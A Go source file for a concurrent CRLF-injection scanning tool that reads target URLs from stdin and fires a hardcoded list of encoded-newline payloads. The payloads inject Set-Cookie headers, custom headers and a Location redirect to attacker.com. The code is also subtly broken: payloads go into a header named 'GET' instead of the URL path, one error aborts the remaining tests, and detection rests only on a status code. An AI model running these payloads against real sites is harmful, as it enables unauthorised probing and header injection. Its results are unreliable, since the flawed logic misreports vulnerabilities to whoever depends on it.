package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	statusCode int
)

func signalHandler(c chan os.Signal) {
	for {
		sig := <-c
		fmt.Printf("\nExecution stopped by signal: %v\n", sig)
		os.Exit(0)
	}
}

func performCRLFInjection(url string, statusCode int, wg *sync.WaitGroup) {
	defer wg.Done()

	headersToTest := []map[string]string{
		{"User-Agent": "malicious%0d%0aContent-Length: 0"},
		{"Host": "malicious%0d%0aContent-Length: 0"},
		{"GET": "/injector"},
		{"GET": "/%0D%0a%20Set-Cookie:injector=success"},
		{"GET": "/%E5%98%8D%E5%98%8ASet-Cookie:injector=success"},
		{"GET": "/?lang=en%250D%250ALocation:%20https://attacker.com/"},
		{"GET": "/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://attacker.com/"},
		{"GET": "/%0d%0ainjector:success"},
		{"GET": "/%0ainjector:success"},
		{"GET": "/%0dinjector:success"},
		{"GET": "/%23%0dinjector:success"},
		{"GET": "/%3f%0dinjector:success"},
		{"GET": "/%250ainjector:success"},
		{"GET": "/%25250ainjector:success"},
		{"GET": "/%%0a0ainjector:success"},
		{"GET": "/%3f%0dinjector:success"},
		{"GET": "/%23%0dinjector:success"},
		{"GET": "/%25%30ainjector:success"},
		{"GET": "/%25%30%61injector:success"},
		{"GET": "/%u000ainjector:success"},
		// Add more headers to test as needed
	}

	for _, headers := range headersToTest {
		client := &http.Client{}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] Error creating request for %s: %s\n", url, err)
			return
		}

		for key, value := range headers {
			req.Header.Set(key, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] Error requesting %s: %s\n", url, err)
			return
		}

		defer resp.Body.Close()

		if statusCode > 0 && resp.StatusCode == statusCode {
			fmt.Printf("[+] Potential CRLF Injection vulnerability found at %s, Status Code: %d\n", url, resp.StatusCode)
			fmt.Printf("    Injected Headers: %v\n", headers)
		} else {
			fmt.Printf("[-] No CRLF Injection vulnerability found at %s with Headers: %v\n", url, headers)
		}
	}
}

func printBanner() {
	banner := `
 ______     ______     __         ______  
/\  ___\   /\  == \   /\ \       /\  ___\ 
\ \ \____  \ \  __<   \ \ \____  \ \  __\ 
 \ \_____\  \ \_\ \_\  \ \_____\  \ \_\   
  \/_____/   \/_/ /_/   \/_____/   \/_/   
  
	adrianalvird [ 1.0.0 ]
`
	fmt.Println(banner)
}


func main() {
	statusCodePtr := flag.Int("mc", 0, "Expected status code")
	flag.Parse()
	printBanner()

	statusCode = *statusCodePtr

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)

	go signalHandler(c)

	var wg sync.WaitGroup

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		targetURL := strings.TrimSpace(scanner.Text())
		wg.Add(1)
		go performCRLFInjection(targetURL, statusCode, &wg)
		time.Sleep(100 * time.Millisecond) // Introduce a delay between requests to avoid potential issues
	}

	wg.Wait()
}

